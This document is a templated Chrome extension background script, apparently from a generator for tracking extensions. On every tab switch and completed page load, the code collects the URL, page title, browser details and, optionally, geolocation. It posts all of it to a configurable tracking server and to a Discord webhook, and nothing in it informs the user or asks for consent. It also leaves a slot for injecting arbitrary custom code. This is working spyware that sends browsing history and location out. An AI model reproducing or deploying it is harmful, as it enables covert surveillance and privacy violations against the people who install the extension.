
// Background service worker for {{EXTENSION_NAME}}
let trackingData = {};

// Track tab changes
chrome.tabs.onActivated.addListener(async (activeInfo) => {
  if ({{FEATURE_IP_TRACKING}} || {{FEATURE_BROWSER_INFO}}) {
    const tab = await chrome.tabs.get(activeInfo.tabId);
    await collectAndSendData(tab);
  }
});

// Track navigation
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url) {
    if ({{FEATURE_IP_TRACKING}} || {{FEATURE_BROWSER_INFO}}) {
      await collectAndSendData(tab);
    }
  }
});

// Collect and send data
async function collectAndSendData(tab) {
  try {
    const data = {
      timestamp: Date.now(),
      url: tab.url,
      title: tab.title,
      extensionName: '{{EXTENSION_NAME}}'
    };

    // Add browser info if enabled
    if ({{FEATURE_BROWSER_INFO}}) {
      data.userAgent = navigator.userAgent;
      data.platform = navigator.platform;
      data.language = navigator.language;
      data.cookieEnabled = navigator.cookieEnabled;
      data.onLine = navigator.onLine;
    }

    // Add geolocation if enabled and permitted
    if ({{FEATURE_GEOLOCATION}}) {
      try {
        const position = await getCurrentPosition();
        data.location = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy
        };
      } catch (e) {
        console.log('Geolocation not available');
      }
    }

    // Send to tracking server
    await sendToServer(data);

    // Send to webhook if configured
    const webhookUrl = '{{WEBHOOK_URL}}';
    if (webhookUrl) {
      await sendToWebhook(data, webhookUrl);
    }

  } catch (error) {
    console.error('Error collecting data:', error);
  }
}

// Send data to tracking server
async function sendToServer(data) {
  try {
    const response = await fetch('{{TRACKING_SERVER}}/api/extension-track', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data)
    });
    
    if (!response.ok) {
      throw new Error('Failed to send to server');
    }
  } catch (error) {
    console.error('Error sending to server:', error);
  }
}

// Send data to Discord webhook
async function sendToWebhook(data, webhookUrl) {
  try {
    const embed = {
      title: "🔍 Extension Activity Detected",
      color: 0x3498db,
      fields: [
        { name: "URL", value: data.url || "Unknown", inline: false },
        { name: "Title", value: data.title || "Unknown", inline: false },
        { name: "Timestamp", value: new Date(data.timestamp).toLocaleString(), inline: true }
      ],
      footer: { text: `Extension: ${data.extensionName}` }
    };

    if (data.location) {
      embed.fields.push({
        name: "Location",
        value: `${data.location.latitude}, ${data.location.longitude}`,
        inline: true
      });
    }

    if (data.userAgent) {
      embed.fields.push({
        name: "User Agent",
        value: data.userAgent.substring(0, 100) + "...",
        inline: false
      });
    }

    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (error) {
    console.error('Error sending to webhook:', error);
  }
}

// Get current position
function getCurrentPosition() {
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(resolve, reject, {
      timeout: 10000,
      maximumAge: 300000
    });
  });
}

// Custom user code
{{CUSTOM_CODE}}
